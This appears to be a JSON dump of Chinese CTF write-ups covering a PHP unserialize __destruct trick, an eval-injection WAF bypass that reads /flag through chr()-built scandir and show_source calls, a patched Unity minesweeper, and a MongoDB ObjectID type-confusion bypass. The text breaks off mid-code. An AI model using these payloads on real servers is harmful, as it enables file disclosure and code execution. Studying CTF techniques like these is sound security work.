[{"title":"35C3CTF-php","url":"/2019/05/15/35C3CTF-php/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!-- more --&gt;</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">$line = trim(fgets(STDIN));</span><br><span class=\"line\"></span><br><span class=\"line\">$flag = file_get_contents(<span class=\"string\">&#x27;/flag&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">B</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">global</span> $flag;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $flag;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a = @unserialize($line);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Exception</span>(<span class=\"string\">&#x27;Well that was unexpected!&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> $a;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\r\n<p>原以为 PHP 里一个类的__destruct 方法在程序结束时自动调用，结果不是。unserialize 反序列化一个类后，如果变量个数对应不上的话，会直接销毁原有的类，调用__destruct 方法。这个题就很简单了，让 unserialize 出错就行了。<code>serialize(new B())</code> 后返回 O:1:”B”:0:{}，class B 里没有任何内部变量，因此 0:{}，我们改成任意值，即可让其报错。O:1:”B”:1:{} 就可以了。__destruct 方法自动调用。</p>\r\n\n    <div id=\"aplayer-DkSkSsns\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"862098540\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{b6b31fd1-4e2f-4a50-82af-21290dc253ec}</p>\r\n","categories":["Writeups"],"tags":["Unserialize","PHP"]},{"title":"BUUOJ-刷题-Web-Easy-Calc","url":"/2020/07/25/BUUOJ-%E5%88%B7%E9%A2%98-Web-Easy-Calc/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>RoarCTF的Easy Calc。</p>\r\n<p>又来万恶的计算器了。</p>\r\n<p>开题就是个输入表达式的页面，注释提示他上了WAF。但是是什么WAF，暂时不清楚。</p>\r\n<p>输入会AJAX发到calc.php里，我们直接打开calc.php发现给了源码。</p>\r\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">&#x27;num&#x27;</span>]))&#123;</span><br><span class=\"line\">    show_source(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        $str = $_GET[<span class=\"string\">&#x27;num&#x27;</span>];</span><br><span class=\"line\">        $blacklist = [<span class=\"string\">&#x27; &#x27;</span>, <span class=\"string\">&#x27;\\t&#x27;</span>, <span class=\"string\">&#x27;\\r&#x27;</span>, <span class=\"string\">&#x27;\\n&#x27;</span>,<span class=\"string\">&#x27;\\&#x27;&#x27;</span>, <span class=\"string\">&#x27;&quot;&#x27;</span>, <span class=\"string\">&#x27;`&#x27;</span>, <span class=\"string\">&#x27;\\[&#x27;</span>, <span class=\"string\">&#x27;\\]&#x27;</span>,<span class=\"string\">&#x27;\\$&#x27;</span>,<span class=\"string\">&#x27;\\\\&#x27;</span>,<span class=\"string\">&#x27;\\^&#x27;</span>];</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> ($blacklist <span class=\"keyword\">as</span> $blackitem) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (preg_match(<span class=\"string\">&#x27;/&#x27;</span> . $blackitem . <span class=\"string\">&#x27;/m&#x27;</span>, $str)) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;what are you want to do?&quot;</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"string\">&#x27;echo &#x27;</span>.$str.<span class=\"string\">&#x27;;&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\r\n<p>不允许空格、单双引号、反引号、中括号、$、^、。但是实际上我们在num参数那里输入任何字母都会返回403？403很有意思，calc.php肯定可以正常访问，但我们输入字母后返回403，结合之前的WAF提示，猜测是WAF拦截造成的。</p>\r\n<p>注意一个问题，WAF不一定是PHP级别的WAF，Apache上搞个modsecurity也叫WAF。而如果WAF不能正确理解PHP的特性，就可能造成绕过。详细请参考<a href=\"https://www.freebuf.com/articles/web/213359.html\">这个</a>。</p>\r\n<p>那么，我们尝试在URL那里加个空格绕过？输入<code>? num=a</code>，发现正常返回了a，那就好办了。构造Payload。</p>\r\n<p>可以用小括号与<code>.</code>，尝试读目录，scandir需要一个字符串作为参数，由于单双引号被过滤，我们可以使用chr()与<code>.</code>拼接。提交<code>? num=1;scandir(chr(46))</code>，没看到flag，那就看根目录<code>? num=1;scandir(chr(47))</code>，发现有flag，读就完事了。<code>? num=1;show_source(chr(47).chr(102).chr(108).chr(97).chr(103))</code>。</p>\r\n\n    <div id=\"aplayer-FLSIYsUd\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"27731369\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{b39e2900-9680-4e81-b077-fa1b0fd8fba9}</p>\r\n","categories":["Writeups"]},{"title":"BUUOJ刷题-Misc-Mine-Sweeping","url":"/2020/06/02/BUUOJ%E5%88%B7%E9%A2%98-Misc-Mine-Sweeping/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>De1CTF 2019的Mine Sweeping，你确定这不是道Reverse?</p>\r\n<p>Unity游戏，直接找Data目录下的Managed的DLL文件，发现一个Assembly-CSharp.dll，应该就是核心代码了。</p>\r\n<p>拖到dotPeek里，顺利反编译，然后直接Export to project，VS改代码不香么？</p>\r\n<p>导出来3个文件，Grid.cs里包含GameWin()和GameLose()方法，而Element.cs里的OnMouseUpAsButton()包含有\"game over:lose\"等关键字符串。</p>\r\n<p>这道题有很多种解法：</p>\r\n<h1 id=\"patch\">1 Patch</h1>\r\n<p>研究OnMouseUpAsButton()方法： <figure class=\"highlight csharp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">OnMouseUpAsButton</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (Grids._instance.bGameEnd || <span class=\"keyword\">this</span>.bIsOpen)</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.bIsOpen = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> x = (<span class=\"keyword\">int</span>)<span class=\"keyword\">this</span>.transform.position.x;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> y = (<span class=\"keyword\">int</span>)<span class=\"keyword\">this</span>.transform.position.y;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.bIsMine)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.SafeAndThunder(<span class=\"number\">0</span>);</span><br><span class=\"line\">        Grids._instance.bGameEnd = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        Grids._instance.GameLose();</span><br><span class=\"line\">        MonoBehaviour.print((<span class=\"keyword\">object</span>)<span class=\"string\">&quot;game over: lose&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.SafeAndThunder(Grids._instance.CountAdjcentNum(x, y));</span><br><span class=\"line\">        Grids._instance.Flush(x, y, <span class=\"keyword\">new</span> <span class=\"keyword\">bool</span>[<span class=\"number\">29</span>, <span class=\"number\">29</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!Grids._instance.GameWin())</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    Grids._instance.bGameEnd = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    MonoBehaviour.print((<span class=\"keyword\">object</span>)<span class=\"string\">&quot;game over: win&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure> 很明显的，如果bIsMine为真，执行GameLose()方法。因此我们注释掉三行，变成这样： <figure class=\"highlight csharp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">OnMouseUpAsButton</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (Grids._instance.bGameEnd || <span class=\"keyword\">this</span>.bIsOpen)</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.bIsOpen = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> x = (<span class=\"keyword\">int</span>)<span class=\"keyword\">this</span>.transform.position.x;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> y = (<span class=\"keyword\">int</span>)<span class=\"keyword\">this</span>.transform.position.y;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.bIsMine)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.SafeAndThunder(<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"comment\">//Grids._instance.bGameEnd = true;</span></span><br><span class=\"line\">        <span class=\"comment\">//Grids._instance.GameLose();</span></span><br><span class=\"line\">        <span class=\"comment\">//MonoBehaviour.print((object)&quot;game over: lose&quot;);</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.SafeAndThunder(Grids._instance.CountAdjcentNum(x, y));</span><br><span class=\"line\">        Grids._instance.Flush(x, y, <span class=\"keyword\">new</span> <span class=\"keyword\">bool</span>[<span class=\"number\">29</span>, <span class=\"number\">29</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!Grids._instance.GameWin())</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    Grids._instance.bGameEnd = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    MonoBehaviour.print((<span class=\"keyword\">object</span>)<span class=\"string\">&quot;game over: win&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure> 这样就算踩雷也不会Game Over了。然后我们发现翻了整个代码也没有发现ShowImage之类的调用，那么猜一下这个29*29的方块会不会是某种二维码表现形式。</p>\r\n<p>注意到在判断bIsMine的时候if和else代码块都调用了SafeAndThunder() <figure class=\"highlight csharp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">SafeAndThunder</span>(<span class=\"params\"><span class=\"keyword\">int</span> adjcent</span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.bIsMine)</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.GetComponent&lt;SpriteRenderer&gt;().sprite = <span class=\"keyword\">this</span>.Thor;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">      <span class=\"keyword\">this</span>.GetComponent&lt;SpriteRenderer&gt;().sprite = <span class=\"keyword\">this</span>.Athene[adjcent];</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure> 不是很熟Unity，目测是某种模型？我们尝试把if和else调换后编译替换Assembly-CSharp.dll文件，发现数字和雷的图标对调了，证实了我们的猜测。 然后就发现了下面的DawnsLight() <figure class=\"highlight csharp\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.bIsMine)</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.GetComponent&lt;SpriteRenderer&gt;().sprite = <span class=\"keyword\">this</span>.Hodur;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.GetComponent&lt;SpriteRenderer&gt;().sprite = <span class=\"keyword\">this</span>.Baldr;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure> 同样的测试一下，发现Baldr对应白色，Hodur对应黑色。很明显了，二维码。 下面我们要让它显示出来。DawnsLight()函数有一次调用，在Grids.cs里的GameWin() <figure class=\"highlight csharp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">bool</span> <span class=\"title\">GameWin</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  Elements[,] eleGrids1 = <span class=\"keyword\">this</span>.eleGrids;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> upperBound1 = eleGrids1.GetUpperBound(<span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">int</span> upperBound2 = eleGrids1.GetUpperBound(<span class=\"number\">1</span>);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> lowerBound1 = eleGrids1.GetLowerBound(<span class=\"number\">0</span>); lowerBound1 &lt;= upperBound1; ++lowerBound1)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> lowerBound2 = eleGrids1.GetLowerBound(<span class=\"number\">1</span>); lowerBound2 &lt;= upperBound2; ++lowerBound2)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      Elements elements = eleGrids1[lowerBound1, lowerBound2];</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!elements.bIsOpen &amp;&amp; !elements.bIsMine)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  Elements[,] eleGrids2 = <span class=\"keyword\">this</span>.eleGrids;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> upperBound3 = eleGrids2.GetUpperBound(<span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">int</span> upperBound4 = eleGrids2.GetUpperBound(<span class=\"number\">1</span>);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> lowerBound1 = eleGrids2.GetLowerBound(<span class=\"number\">0</span>); lowerBound1 &lt;= upperBound3; ++lowerBound1)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> lowerBound2 = eleGrids2.GetLowerBound(<span class=\"number\">1</span>); lowerBound2 &lt;= upperBound4; ++lowerBound2)</span><br><span class=\"line\">      eleGrids2[lowerBound1, lowerBound2].DawnsLight();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure> 我们把那个return false以及上面的if注释掉，DawnsLight()会直接执行。 编译后替换文件执行后，点击就会显示二维码。 <img src=\"/2020/06/02/BUUOJ%E5%88%B7%E9%A2%98-Misc-Mine-Sweeping/QRCode.png\" class=\"\"> 扫就行了。</p>\r\n\n    <div id=\"aplayer-rNchLhpB\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"26102207\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{269bc18b-081d-49e7-b0b2-2c0847e6edf8}</p>\r\n","categories":["Writeups"],"tags":["Misc","C#"]},{"title":"BUUOJ刷题-Web-996Game","url":"/2019/12/01/BUUOJ%E5%88%B7%E9%A2%98-Web-996Game/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>*CTF 2019的996Game。给了个Hint:<code>db.a.find(&#123;\"b\":&#123;\"$gt\":1,\"c\":\"d\"&#125;&#125;)</code>。</p>\r\n<p>上来就满满的页游画风，目测是某开源网页游戏改的题，果然，翻一下源码，提示我们去找https://github.com/Jerenaux/phaserquest。发现是个NodeJS项目，把源码脱下来看看。发现直接将js目录暴露出来了。 <a id=\"more\"></a> <figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\">app.use(<span class=\"string\">&#x27;/css&#x27;</span>,express.static(__dirname + <span class=\"string\">&#x27;/css&#x27;</span>));</span><br><span class=\"line\">app.use(<span class=\"string\">&#x27;/js&#x27;</span>,express.static(__dirname + <span class=\"string\">&#x27;/js&#x27;</span>));</span><br><span class=\"line\">app.use(<span class=\"string\">&#x27;/assets&#x27;</span>,express.static(__dirname + <span class=\"string\">&#x27;/assets&#x27;</span>));</span><br></pre></td></tr></table></figure> js/server即为服务端的代码，合理猜测出题人修改了这里。我们把服务器上的源码脱下来进行比对。 <img src=\"/2019/12/01/BUUOJ%E5%88%B7%E9%A2%98-Web-996Game/Diffs.png\" class=\"\" title=\"GameServer.js的差别\"> 多了个eval()，事情就有点大了。</p>\r\n<p>GameServer.server来源于server.js中的声明，<code>var server=require('http').Server(app);</code>和<code>gs.server=server;</code>。而db来自mongodb。也就是说我们需要让findOne操作失败，并且控制返回信息。我们可控的是什么？loadPlayer函数参数一个是socket，一个是id。在server.js中loadPlayer函数在io.on()函数执行时被调用，用的是socket.io库，采用WebSocket协议进行通讯，那么id应该可控。</p>\r\n<p>我们具体跟一下代码，在client下的client.js中发现，客户端会将相关参数保存到浏览器的localStorage里。 <figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\">Client.socket.on(<span class=\"string\">&#x27;pid&#x27;</span>,<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">playerID</span>)</span>&#123; <span class=\"comment\">// the &#x27;pid&#x27; event is used for the server to tell the client what is the ID of the player</span></span><br><span class=\"line\">    Client.setLocalData(playerID);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure> <img src=\"/2019/12/01/BUUOJ%E5%88%B7%E9%A2%98-Web-996Game/localStorage.png\" class=\"\" title=\"浏览器的localStorage\"> 那么我们手动修改playerID会怎样？Firefox修改localStorage里的playerID后重刷新页面，Play后发现游戏死在了Creating World阶段，肯定是报错了，但是报错点在哪里？这个光看源码是不够的了，原repo给出了Dockerfile，我们搭起来环境看看。 <img src=\"/2019/12/01/BUUOJ%E5%88%B7%E9%A2%98-Web-996Game/ServerError.png\" class=\"\" title=\"服务器报错\"> 注意报错点是在bson/lib/objectid.js里的new ObjectID()里。要求我们的playerID是24位字符，随便修改一个合法的playerID进入游戏。我们来看一下objectid.js里面有什么内容。涉及到的new ObjectID代码如下： <figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> ObjectID = <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">ObjectID</span>(<span class=\"params\">id</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// Duck-typing to support ObjectId from different npm packages</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (id <span class=\"keyword\">instanceof</span> ObjectID) <span class=\"keyword\">return</span> id;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!(<span class=\"built_in\">this</span> <span class=\"keyword\">instanceof</span> ObjectID)) <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> ObjectID(id);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">this</span>._bsontype = <span class=\"string\">&#x27;ObjectID&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// The most common usecase (blank id, new objectId instance)</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (id == <span class=\"literal\">null</span> || <span class=\"keyword\">typeof</span> id === <span class=\"string\">&#x27;number&#x27;</span>) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Generate a new id</span></span><br><span class=\"line\">    <span class=\"built_in\">this</span>.id = <span class=\"built_in\">this</span>.generate(id);</span><br><span class=\"line\">    <span class=\"comment\">// If we are caching the hex string</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ObjectID.cacheHexString) <span class=\"built_in\">this</span>.__id = <span class=\"built_in\">this</span>.toString(<span class=\"string\">&#x27;hex&#x27;</span>);</span><br><span class=\"line\">    <span class=\"comment\">// Return the object</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// Check if the passed in id is valid</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> valid = ObjectID.isValid(id);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// Throw an error if it&#x27;s not a valid setup</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!valid &amp;&amp; id != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(</span><br><span class=\"line\">      <span class=\"string\">&#x27;Argument passed in must be a single String of 12 bytes or a string of 24 hex characters&#x27;</span></span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (valid &amp;&amp; <span class=\"keyword\">typeof</span> id === <span class=\"string\">&#x27;string&#x27;</span> &amp;&amp; id.length === <span class=\"number\">24</span> &amp;&amp; hasBufferType) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> ObjectID(<span class=\"keyword\">new</span> Buffer(id, <span class=\"string\">&#x27;hex&#x27;</span>));</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (valid &amp;&amp; <span class=\"keyword\">typeof</span> id === <span class=\"string\">&#x27;string&#x27;</span> &amp;&amp; id.length === <span class=\"number\">24</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ObjectID.createFromHexString(id);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (id != <span class=\"literal\">null</span> &amp;&amp; id.length === <span class=\"number\">12</span>) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// assume 12 byte string</span></span><br><span class=\"line\">    <span class=\"built_in\">this</span>.id = id;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (id != <span class=\"literal\">null</span> &amp;&amp; id.toHexString) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Duck-typing to support ObjectId from different npm packages</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> id;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(</span><br><span class=\"line\">      <span class=\"string\">&#x27;Argument passed in must be a single String of 12 bytes or a string of 24 hex characters&#x27;</span></span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (ObjectID.cacheHexString) <span class=\"built_in\">this</span>.__id = <span class=\"built_in\">this</span>.toString(<span class=\"string\">&#x27;hex&#x27;</span>);</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure> 我们的报错是因为没有通过isValid()的检查，isValid()代码如下： <figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\">ObjectID.isValid = <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isValid</span>(<span class=\"params\">id</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (id == <span class=\"literal\">null</span>) <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> id === <span class=\"string\">&#x27;number&#x27;</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> id === <span class=\"string\">&#x27;string&#x27;</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> id.length === <span class=\"number\">12</span> || (id.length === <span class=\"number\">24</span> &amp;&amp; checkForHexRegExp.test(id));</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (id <span class=\"keyword\">instanceof</span> ObjectID) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (id <span class=\"keyword\">instanceof</span> _Buffer) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// Duck-Typing detection of ObjectId like objects</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (id.toHexString) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> id.id.length === <span class=\"number\">12</span> || (id.id.length === <span class=\"number\">24</span> &amp;&amp; checkForHexRegExp.test(id.id));</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure> 用的typeof，如果是Stirng，判断id.length是否等于12。JavaScript是种弱类型语言，原本代码认为提交的id是String对象而直接用length属性获得长度，如果我们构造一个对象，包含length==12的属性呢？Payload为<code>id=&#123;\"id\":&#123;\"length\":12&#125;&#125;</code>。这样就绕过isValid()的检查了，回到ObjectID构造函数，然后它会检查id本身是什么类型，目前我们的id已经是Object了，看下面两个else if： <figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (id != <span class=\"literal\">null</span> &amp;&amp; id.length === <span class=\"number\">12</span>) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// assume 12 byte string</span></span><br><span class=\"line\">    <span class=\"built_in\">this</span>.id = id;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (id != <span class=\"literal\">null</span> &amp;&amp; id.toHexString) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Duck-typing to support ObjectId from different npm packages</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> id;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(</span><br><span class=\"line\">      <span class=\"string\">&#x27;Argument passed in must be a single String of 12 bytes or a string of 24 hex characters&#x27;</span></span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (ObjectID.cacheHexString) <span 